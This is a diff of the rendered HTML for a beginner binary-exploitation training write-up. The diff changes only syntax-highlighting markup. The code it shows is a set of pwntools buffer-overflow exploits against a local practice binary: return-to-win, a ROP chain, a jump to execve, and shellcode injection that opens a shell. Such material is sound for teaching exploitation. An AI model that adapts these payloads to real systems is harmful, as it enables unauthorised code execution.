@@ -1,4 +1,4 @@
-I"aX<p><img src="/assets/images/pwntraining1/pwntrain20.png" alt="" /></p>
+I"�Z<p><img src="/assets/images/pwntraining1/pwntrain20.png" alt="" /></p>
 
 <h3 id="introduction">Introduction:</h3>
 
@@ -157,11 +157,11 @@ Though there wont be any win() function in real life applications, its your task
 
 <p>ok lets start writing our script in python. First we will <code class="language-plaintext highlighter-rouge">import pwntools</code> library to make things easier. Next we will connect to our binary and send/recieve messages.</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> <span class="c1"># Importing the library called pwntools
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span> <span class="c1"># Importing the library called pwntools
 </span>
-<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"ret2shellcode"</span><span class="p">)</span> <span class="c1"># create a instance/process with the binary. helps to interact with the program. 
-</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004011a5</span><span class="p">))</span> <span class="c1"># Send the payload(attack input) to the program.
-</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span> <span class="c1">#If we get a shell make it interactive.
+<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">"</span><span class="s">ret2shellcode</span><span class="sh">"</span><span class="p">)</span> <span class="c1"># create a instance/process with the binary. helps to interact with the program. 
+</span><span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x00000000004011a5</span><span class="p">))</span> <span class="c1"># Send the payload(attack input) to the program.
+</span><span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span> <span class="c1">#If we get a shell make it interactive.
 </span></code></pre></div></div>
 
 <p>Here in the sendline command I am giving “a” * 0x60 to fill the buf variable and extra “a” * 8 to fill the rbp (base pointer) and then the address of win function. wait what is that p64() ?</p>
@@ -198,12 +198,12 @@ Though there wont be any win() function in real life applications, its your task
 
 <p>We can pop the registers to put the values we want and since every gadget has a return attached to it, we can call win function after those gadgets.</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"ret2shellcode"</span><span class="p">)</span>
-<span class="n">pause</span><span class="p">()</span>
-<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000040129b</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000401299</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004011a5</span><span class="p">))</span>
-<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">"</span><span class="s">ret2shellcode</span><span class="sh">"</span><span class="p">)</span>
+<span class="nf">pause</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x000000000040129b</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x0000000000401299</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x00000000004011a5</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
 <p><img src="/assets/images/pwntraining1/pwntrain9.png" alt="" /></p>
@@ -212,11 +212,11 @@ Though there wont be any win() function in real life applications, its your task
 
 <p>I know you went through all the struggle to set the arguments right, but if you can control the return address and jump literally anywhere, then why not just jump directly on the execve function.</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"ret2shellcode"</span><span class="p">)</span>
-<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004011d1</span><span class="p">))</span> <span class="c1"># address to execve
-</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">"</span><span class="s">ret2shellcode</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x00000000004011d1</span><span class="p">))</span> <span class="c1"># address to execve
+</span><span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 <blockquote>
   <p>Here we avoided the constraints and directly jumped to the execve funtion. Clever of you.</p>
@@ -240,28 +240,28 @@ Though there wont be any win() function in real life applications, its your task
 </ul>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
 	<span class="k">global</span> <span class="n">p</span>
 	<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
-		<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'localhost'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+		<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">localhost</span><span class="sh">'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
 	<span class="k">else</span><span class="p">:</span>
-		<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span> <span class="c1"># start the process.
+		<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">process</span><span class="p">()</span> <span class="c1"># start the process.
 </span>
-<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./ret2shellcode'</span><span class="p">)</span> 
-<span class="n">start</span><span class="p">()</span>
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./ret2shellcode</span><span class="sh">'</span><span class="p">)</span> 
+<span class="nf">start</span><span class="p">()</span>
 
-<span class="n">buf_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="mi">2</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">()[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="c1"># recvlines and then get the leak
+<span class="n">buf_addr</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvlines</span><span class="p">(</span><span class="mi">2</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">()[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="c1"># recvlines and then get the leak
 </span>
-<span class="n">payload</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="n">sh</span><span class="p">())</span> <span class="c1"># generates a shellcode compatible with linux systems
-</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x90</span><span class="s">'</span><span class="o">*</span><span class="p">(</span><span class="mi">104</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span> <span class="c1"># spans the gap between buf variable and return 
-</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span> <span class="c1"># address of the buf variable
+<span class="n">payload</span> <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="nf">sh</span><span class="p">())</span> <span class="c1"># generates a shellcode compatible with linux systems
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x90</span><span class="sh">'</span><span class="o">*</span><span class="p">(</span><span class="mi">104</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span> <span class="c1"># spans the gap between buf variable and return 
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span> <span class="c1"># address of the buf variable
 </span>
-<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="c1"># send the payload
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="c1"># send the payload
 </span>
-<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span> <span class="c1"># doesnt close the shell and keeps it open for us.
-</span><span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span> <span class="c1"># doesnt close the shell and keeps it open for us.
+</span><span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
 </code></pre></div></div>
 
 <p>Hope you liked the pwn training 1. More training writeups coming soon ! :D</p>
